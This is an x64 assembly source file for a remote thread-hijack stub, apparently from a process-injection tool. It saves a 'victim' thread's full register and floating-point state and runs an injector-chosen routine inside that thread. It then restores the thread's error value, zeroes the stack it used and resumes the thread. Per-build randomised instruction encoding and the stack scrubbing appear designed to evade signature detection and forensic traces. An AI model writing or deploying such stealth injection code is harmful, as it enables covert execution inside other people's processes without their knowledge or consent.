INCLUDE RemoteShell.inc

REMOTE_THREAD SEGMENT ALIGN(16) 'CODE'

PUBLIC RemoteThreadHijackBegin
PUBLIC RemoteThreadHijackEnd
PUBLIC RemoteThreadReturnTarget
PUBLIC RemoteThreadState





PUBLIC RemoteThreadLeaStateIn
PUBLIC RemoteThreadLeaStateOut
PUBLIC RemoteThreadJmpReturn
PUBLIC RemoteThreadTebReadIn
PUBLIC RemoteThreadTebReadOut
PUBLIC RemoteThreadTebWrite

IFDEF AMEGER_STUB_SEED
STUB_SEED EQU AMEGER_STUB_SEED
ELSE
.ERR <AMEGER_STUB_SEED must be provided by the build (randomized per build)>
ENDIF
;; STUB_SEED only steers encoding choices. It must never select between semantically
;; different instructions: STUB_FP_ADDR picks between two equivalent ways of forming
;; the FP area address, and STUB_RSP_CAPTURE picks between two equivalent ways of
;; reading RSP. Both are pure diversification.
STUB_FP_ADDR     EQU (STUB_SEED AND 1)
STUB_RSP_CAPTURE EQU (STUB_SEED AND 4)

RemoteThreadHijackBegin:
    pushfq
    push rax
    push rcx
    push rdx
    push rbx
    push rbp
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

RemoteThreadLeaStateIn:
    lea rbx, [RemoteThreadState]
IF STUB_RSP_CAPTURE
    lea r12, [rsp]
ELSE
    mov r12, rsp
ENDIF
    mov [rbx+SR_SAVED_RSP], r12
    and rsp, 0FFFFFFFFFFFFFFF0h
    sub rsp, 40h

IF STUB_FP_ADDR
    mov r10, rbx
    add r10, SR_FP_AREA
ELSE
    lea r10, [rbx+SR_FP_AREA]
ENDIF
    cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
    jne StubFpSaveFallback
    ;; XGETBV reads the XCR0 of whichever thread executes this stub, so the mask is
    ;; derived from the victim's own XCR0 and never from the injector's. The value the
    ;; injector staged in SR_FP_MASK is the CPU capability ceiling; the intersection
    ;; of the two is what is legal to request (anything else raises #GP).
    xor ecx, ecx
    xgetbv
    and eax, SR_FP_XCR0_MASK
    and eax, dword ptr [rbx+SR_FP_MASK]
    mov dword ptr [rbx+SR_FP_MASK], eax
    xor edx, edx
    ;; xsave64 (REX.W) is the only form that captures the full 256-bit XMM/YMM state.
    xsave64 [r10]
    jmp StubFpSaveDone
StubFpSaveFallback:
    ;; No XSAVE on this CPU: FXSAVE64 still captures the full XMM registers. The YMM
    ;; upper halves cannot be captured by FXSAVE at all, but the stub never writes them
    ;; either, so they pass through untouched.
    fxsave64 [r10]
StubFpSaveDone:

    fldcw word ptr [rbx+SR_SHELL_CW]
    ldmxcsr dword ptr [rbx+SR_SHELL_MXCSR]

    mov r15, [rbx+SR_ROUTINE]
    mov rcx, [rbx+SR_ARG]
RemoteThreadTebReadIn:
    mov r11d, gs:[TEB_LAST_ERROR]
    mov [rbx+SR_BUFFER], r11d
    mov qword ptr [rbx+SR_STATE], SR_STATE_RUNNING

    rdtsc
    shl rdx, 32
    or rax, rdx
    mov [rbx+SR_CYCLES_DELTA], rax
    mov rax, r15
    call rax
    mov [rbx+SR_RET], eax

    push rcx
    push rdx
    rdtsc
    shl rdx, 32
    or rax, rdx
    sub rax, [rbx+SR_CYCLES_DELTA]
    mov [rbx+SR_CYCLES_DELTA], rax
    pop rdx
    pop rcx
RemoteThreadTebReadOut:
    mov r11d, gs:[TEB_LAST_ERROR]
    mov [rbx+SR_LAST_ERROR], r11d
    mov r11d, [rbx+SR_BUFFER]
RemoteThreadTebWrite:
    mov gs:[TEB_LAST_ERROR], r11d
    mov qword ptr [rbx+SR_STATE], SR_STATE_FINISHED
RemoteThreadLeaStateOut:
    lea rbx, [RemoteThreadState]
    mov r12, [rbx+SR_SAVED_RSP]

IF STUB_FP_ADDR
    mov r10, rbx
    add r10, SR_FP_AREA
ELSE
    lea r10, [rbx+SR_FP_AREA]
ENDIF
    cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
    jne StubFpRestoreFallback
    ;; Reuse the mask the save phase actually used (it was narrowed against the
    ;; victim's XCR0 there); restoring with a different mask would fault or leave the
    ;; saved components unrestored.
    mov eax, dword ptr [rbx+SR_FP_MASK]
    xor edx, edx
    xrstor64 [r10]
    jmp StubFpRestoreDone
StubFpRestoreFallback:
    fxrstor64 [r10]
StubFpRestoreDone:







    lea rdi, [r12]
    mov r10, gs:[10h]
    cmp r10, rdi
    jae StubStackScrubDone

    mov rax, r12
    sub rax, r10
    mov [rbx+SR_SCRUB_BYTES], rax
    mov rdx, rdi
    sub rdx, r10
    shr rdx, 3
    xor r8d, r8d
StubStackScrubLoop:
    test rdx, rdx
    jz StubStackScrubDone
    mov qword ptr [rdi-8], r8
    sub rdi, 8
    dec rdx
    jmp StubStackScrubLoop
StubStackScrubDone:
    mov rsp, r12
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbp
;; Publish the exit sentinel while RBX still addresses the state page; the trailing pops
;; would otherwise restore the victim RBX first. The return jump still reads the target
;; from the state page and the host reclaims the trampoline only once RIP has left the
;; RX code page, so the store must happen before RBX is consumed by the pops.
    mov qword ptr [rbx+SR_STATE], SR_STATE_EXITED
    pop rbx
    pop rdx
    pop rcx
    pop rax
    popfq
RemoteThreadJmpReturn:
    jmp qword ptr [RemoteThreadReturnTarget]

ALIGN 16
RemoteThreadState:
RemoteThreadStateFlag    DQ 0
RemoteThreadRet          DD 0
RemoteThreadPad1         DD 0
RemoteThreadLastError    DD 0
RemoteThreadPad2         DD 0
RemoteThreadArg          DQ 0
RemoteThreadRoutine      DQ 0
RemoteThreadBuffer       DQ 0
RemoteThreadFpFlags      DQ 0
RemoteThreadFpMask       DQ 0
RemoteThreadShellCw      DW 037Fh
RemoteThreadShellCwPad0  DW 0
RemoteThreadShellCwPad1  DD 0
RemoteThreadShellMxcsr   DD 01F80h
RemoteThreadShellMxPad   DD 0
RemoteThreadCyclesDelta  DQ 0
RemoteThreadScrubBytes   DQ 0
RemoteThreadSavedRsp     DQ 0
RemoteThreadFpReserved   BYTE 24 DUP (0)
RemoteThreadFpArea       BYTE SR_FP_AREA_SIZE DUP (0)
RemoteThreadReturnTarget DQ 0

RemoteThreadHijackEnd:

REMOTE_THREAD ENDS

END
